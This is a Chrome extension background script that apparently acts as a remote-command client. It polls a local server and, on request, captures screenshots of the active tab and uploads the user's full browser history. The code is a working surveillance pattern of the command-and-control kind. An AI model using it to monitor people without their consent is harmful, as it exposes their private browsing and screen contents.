// ============ Configuration ============
const SERVER_BASE_URL = 'http://localhost:8080';
let CLIENT_ID = null;
let CLIENT_NAME = 'Chrome Extension';
let USER_NAME = null;
let isConnected = false;

const POLL_ALARM_NAME = 'pollCommands';
const POLL_INTERVAL_MINUTES = 0.033; // ~2 seconds (minimum is 1 minute in production, but dev allows this)

// ============ Initialize ============
// Generate or retrieve client ID
chrome.storage.local.get(['clientId', 'clientName', 'userName'], (result) => {
    CLIENT_ID = result.clientId || generateClientId();
    CLIENT_NAME = result.clientName || 'Chrome Extension';
    USER_NAME = result.userName || null;
    
    // Save client ID if it's new
    if (!result.clientId) {
        chrome.storage.local.set({ clientId: CLIENT_ID });
    }
    
    console.log('🔧 Extension initialized with Client ID:', CLIENT_ID);
    
    // Start polling
    startPolling();
});

// Generate unique client ID
function generateClientId() {
    return 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// ============ HTTP Polling with chrome.alarms ============
function startPolling() {
    console.log('🚀 Starting HTTP polling with chrome.alarms...');
    
    // Register immediately
    registerClient();
    
    // Clear any existing alarm
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        // Create alarm for polling (this works even when service worker is inactive)
        chrome.alarms.create(POLL_ALARM_NAME, {
            delayInMinutes: 0, // Start immediately
            periodInMinutes: POLL_INTERVAL_MINUTES
        });
        console.log('✅ Polling alarm created');
    });
    
    // Also do an immediate poll
    pollForCommands();
}

function stopPolling() {
    chrome.alarms.clear(POLL_ALARM_NAME, () => {
        isConnected = false;
        updatePopupStatus(false);
        console.log('⏹️ Polling stopped');
    });
}

// Listen for alarm events
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === POLL_ALARM_NAME) {
        pollForCommands();
    }
});

// Register with server
async function registerClient() {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/register`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                name: CLIENT_NAME,
                userName: USER_NAME
            })
        });

        if (response.ok) {
            const data = await response.json();
            console.log('✅ Registered with server:', data.message);
            isConnected = true;
            updatePopupStatus(true);
        } else {
            console.error('❌ Registration failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Registration error:', error);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Poll for commands
async function pollForCommands() {
    if (!CLIENT_ID) {
        console.warn('⚠️ No CLIENT_ID set, skipping poll');
        return;
    }
    
    try {
        const response = await fetch(`${SERVER_BASE_URL}/poll-commands/${CLIENT_ID}`);

        if (response.ok) {
            const data = await response.json();
            
            if (!isConnected) {
                isConnected = true;
                updatePopupStatus(true);
            }

            // Process commands
            if (data.commands && data.commands.length > 0) {
                console.log(`📥 Received ${data.commands.length} command(s)`);
                
                for (const command of data.commands) {
                    await processCommand(command);
                }
            }
        } else if (response.status === 404) {
            // Client not found, re-register
            console.log('⚠️ Client not found, re-registering...');
            await registerClient();
        } else {
            console.error('❌ Polling failed:', response.status);
            isConnected = false;
            updatePopupStatus(false);
        }
    } catch (error) {
        console.error('❌ Polling error:', error.message);
        isConnected = false;
        updatePopupStatus(false);
    }
}

// Process received command
async function processCommand(command) {
    console.log(`⚙️ Processing command: ${command.type}`);

    try {
        switch (command.type) {
            case 'take_screenshot':
                console.log(`📸 Screenshot requested by ${command.requestedBy}`);
                await captureScreenshot(command.id);
                break;

            case 'get_history':
                console.log(`📜 History requested by ${command.requestedBy}`);
                await captureHistory(command.id);
                break;

            case 'ping':
                await sendCommandResponse(command.id, 'pong', { message: 'Pong!' });
                console.log('🏓 Pong sent');
                break;

            default:
                console.log(`⚠️ Unknown command type: ${command.type}`);
        }
    } catch (error) {
        console.error('Error processing command:', error);
        await sendCommandResponse(command.id, 'error', { message: error.message });
    }
}

// ============ Screenshot Capture ============
async function captureScreenshot(commandId) {
    try {
        // Get active tab
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        
        if (!tab) {
            throw new Error('No active tab found');
        }

        // Capture the visible tab
        const screenshotUrl = await chrome.tabs.captureVisibleTab(null, {
            format: 'png',
            quality: 100
        });

        console.log('📸 Screenshot captured!');

        // Send to server
        await sendCommandResponse(commandId, 'screenshot', {
            image: screenshotUrl,
            tabTitle: tab.title,
            tabUrl: tab.url
        });

        console.log('✅ Screenshot sent to server!');

    } catch (error) {
        console.error('Error capturing screenshot:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message });
    }
}

// ============ Browser History Capture ============
async function captureHistory(commandId) {
    try {
        // Get all browser history
        const historyItems = await chrome.history.search({
            text: '',
            startTime: 0  // Get all history from the beginning
        });

        console.log(`📜 Browser history captured! (${historyItems.length} entries)`);

        // Send to server
        await sendCommandResponse(commandId, 'history', {
            history: historyItems
        });

        console.log('✅ History sent to server!');

    } catch (error) {
        console.error('Error capturing history:', error);
        await sendCommandResponse(commandId, 'error', { message: error.message });
    }
}

// ============ Send Command Response ============
async function sendCommandResponse(commandId, type, data) {
    try {
        const response = await fetch(`${SERVER_BASE_URL}/command-response`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                clientId: CLIENT_ID,
                commandId: commandId,
                type: type,
                data: data
            })
        });

        if (!response.ok) {
            console.error('❌ Failed to send response:', response.status);
        }
    } catch (error) {
        console.error('❌ Error sending response:', error);
    }
}

// ============ Helper Functions ============
function updatePopupStatus(connected) {
    chrome.runtime.sendMessage({
        type: 'status_update',
        connected: connected,
        serverUrl: SERVER_BASE_URL,
        clientId: CLIENT_ID
    }).catch(() => {
        // Popup not open, ignore
    });
}

// ============ Message Handling from Popup ============
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    switch (request.type) {
        case 'get_status':
            sendResponse({
                connected: isConnected,
                serverUrl: SERVER_BASE_URL,
                clientName: CLIENT_NAME,
                clientId: CLIENT_ID
            });
            break;

        case 'register_user':
            // Store user name
            USER_NAME = request.userName;
            chrome.storage.local.set({ userName: USER_NAME });
            
            // Re-register with server to update user name
            registerClient();
            
            console.log('✅ User registered:', USER_NAME);
            sendResponse({ success: true });
            break;

        case 'connect':
            CLIENT_NAME = request.clientName || CLIENT_NAME;
            
            // Save settings
            chrome.storage.local.set({
                clientName: CLIENT_NAME
            });

            // Restart polling
            startPolling();
            sendResponse({ success: true });
            break;

        case 'disconnect':
            stopPolling();
            sendResponse({ success: true });
            break;

        case 'test_screenshot':
            captureScreenshot('manual_test');
            sendResponse({ success: true });
            break;
    }
    return true;
});